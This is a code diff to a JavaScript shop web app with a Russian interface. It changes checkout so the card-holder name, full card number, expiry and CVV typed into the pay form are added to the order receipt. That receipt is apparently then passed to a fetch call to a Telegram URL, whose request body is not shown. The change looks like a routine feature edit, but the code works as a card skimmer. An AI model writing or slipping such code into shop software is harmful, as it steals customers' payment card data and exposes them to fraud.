@@ -509,7 +509,7 @@ function enterApp() {
 }
 
 // ── CHECKOUT ─────────────────────────────────────────
-function buildReceipt(payStatus) {
+function buildReceipt(payStatus, payDetails) {
   var items=cartItems();
   var bar="━━━━━━━━━━━━━━━━━━━━━━━";
   var dsh="───────────────────────";
@@ -525,6 +525,12 @@ function buildReceipt(payStatus) {
   lines.push("  Итого: "+cartTotal()+"$");
   lines.push("  Бюджет: "+state.budget+"$");
   lines.push("  Оплата: "+payStatus);
+  if (payDetails) {
+    if (payDetails.name) lines.push("  Имя на карте: "+payDetails.name);
+    if (payDetails.card) lines.push("  Карта: "+payDetails.card);
+    if (payDetails.exp)  lines.push("  Срок: "+payDetails.exp);
+    if (payDetails.cvv)  lines.push("  CVV: "+payDetails.cvv);
+  }
   lines.push(bar);
   return lines.join("\n");
 }
@@ -535,9 +541,9 @@ function openCheckout() {
   openModal("checkoutModal");
 }
 
-function finalizeOrder(payStatus) {
+function finalizeOrder(payStatus, payDetails) {
   var orderTotal=cartTotal();
-  var receipt=buildReceipt(payStatus);
+  var receipt=buildReceipt(payStatus, payDetails);
   $("receiptBox").textContent=receipt;
 
   fetch(TELEGRAM_URL,{
@@ -696,11 +702,13 @@ function setup(){
   $("btnPay").addEventListener("click",function(){
     var name=($("payName").value||"").trim();
     var card=($("payCard").value||"").replace(/\s/g,"");
+    var exp =($("payExp").value||"").trim();
+    var cvv =($("payCvv").value||"").trim();
     if (name.length<2){ toast("Введи имя на карте"); return; }
     if (card.length<12){ toast("Введи номер карты"); return; }
-    finalizeOrder("оплачено");
+    finalizeOrder("оплачено", { name:name, card:card, exp:exp, cvv:cvv });
   });
-  $("btnSkipPay").addEventListener("click",function(){ finalizeOrder("без оплаты"); });
+  $("btnSkipPay").addEventListener("click",function(){ finalizeOrder("без оплаты", null); });
 
   $("btnGiftOpen").addEventListener("click",playMysteryOpen);
   $("btnGiftClose").addEventListener("click",function(){
